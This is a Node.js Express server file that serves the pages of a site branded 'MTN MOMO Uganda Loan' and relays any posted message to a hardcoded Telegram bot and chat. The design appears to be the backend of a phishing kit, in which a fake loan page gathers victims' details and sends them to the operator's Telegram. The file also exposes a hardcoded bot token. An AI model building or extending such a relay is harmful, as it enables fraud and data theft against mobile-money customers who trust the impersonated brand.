const express = require('express');
const path = require('path');

const app = express();

// ===== YOUR TELEGRAM CREDENTIALS (hardcoded) =====
const BOT_TOKEN = '8721286574:AAErN0ZEPj6olvQ-BQ9LpoTrfN0eSLkDwX4';
const CHAT_ID = '6258528476';

app.use(express.json({ limit: '20kb' }));
app.use(express.urlencoded({ extended: true, limit: '20kb' }));
app.use(express.static(__dirname));

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime() });
});

app.post('/telegram-alert', async (req, res) => {
    try {
        const { message } = req.body || {};
        if (!message) return res.status(400).json({ success: false });
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        if (!r.ok) {
            const txt = await r.text();
            console.error('Telegram API error:', r.status, txt);
            return res.status(502).json({ success: false });
        }
        res.json({ success: true });
    } catch (err) {
        console.error('telegram-alert error:', err);
        res.status(500).json({ success: false });
    }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ MTN MOMO Uganda Loan running on port ${PORT}`);
});